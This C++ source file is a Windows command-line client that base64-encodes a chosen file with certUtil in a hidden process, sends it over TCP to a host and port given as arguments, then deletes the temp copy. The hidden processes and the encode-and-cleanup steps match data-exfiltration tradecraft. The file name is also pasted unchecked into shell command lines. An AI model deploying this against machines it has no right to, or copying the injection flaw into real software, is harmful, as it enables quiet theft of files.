#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#pragma comment(lib, "ws2_32.lib")
#include <winsock.h>
#include <windows.h>
#include <iostream>
#include <fstream>

using namespace std;

int main(int argc, char** argv) {
    if (argc < 4) {
        std::cout << std::endl << "Error: Not enough arguments!" << std::endl;
        std::cout << "Usage: client.exe [FILE] [HOST_IP] [PORT]" << std::endl;
        return 0;
    }

    const char *filename = argv[1];
    const char *host = argv[2];
    char* p;
    errno = 0;
    long _port = strtol(argv[3], &p, 10);
    if (*p != '\0' || errno != 0) {
        std::cout << "Error: intake error, parsing arguments!" << std::endl;
        return 0;
    }
    const int port = _port;

    SOCKET sock;
    WSADATA wsaData;
    WORD DllVersion = MAKEWORD(2, 1);
    if (WSAStartup(DllVersion, &wsaData) != 0) {
        std::cout << "Error: error with dll version!" << std::endl;
        return 0;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        std::cout << "Error: unable to create socket!" << std::endl;
        return 0;

    }

    HOSTENT *_host = gethostbyname(host);
    if (_host == nullptr) {
        std::cout << "Error: unable to resolve host!" << std::endl;
        return 0;
    }

    sockaddr_in sin;
    ZeroMemory(&sin, sizeof(sin));
    sin.sin_port = htons(port);
    sin.sin_family = AF_INET;
    memcpy(&sin.sin_addr.S_un.S_addr, _host->h_addr_list[0], sizeof(sin.sin_addr.S_un.S_addr));

    if (connect(sock, (const sockaddr *)&sin, sizeof(sin)) != 0) {
        std::cout << "Error: unable to connect to target!" << std::endl;
        return 0;
    }

    std::string _filename = filename;
    send(sock, _filename.c_str(), strlen(_filename.c_str()), 0);

    std::string tmpPath = getenv("TEMP");
    std::string output_file = tmpPath + "\\" + std::to_string(rand()) + std::to_string(rand()) + _filename;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    std::string cmd1 = "certUtil -encode " + _filename + " " + output_file;
    LPSTR command = const_cast<char *>(cmd1.c_str());
    CreateProcess(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    fstream file;
    file.open(output_file, ios::in); 
    if (file.is_open()) {
        std::string line;
        while(getline(file, line)) {
            line += "\n";
            send(sock, line.c_str(), strlen(line.c_str()), 0);
        }
        file.close();
        std::string _success = _filename + " sent to " + argv[2] + " on port " + argv[3];
        std::cout << _success;
    }
    else {
        std::cout << "File not found!" << std::endl;
        std::string file_error = "ERROR: 477224891";
        send(sock, file_error.c_str(), strlen(file_error.c_str()), 0);
    }

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    std::string cmd2 = "del " + output_file;
    LPSTR command2 = const_cast<char *>(cmd2.c_str());
    CreateProcess(NULL, command2, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    closesocket(sock);
    WSACleanup();
    return 0;
}
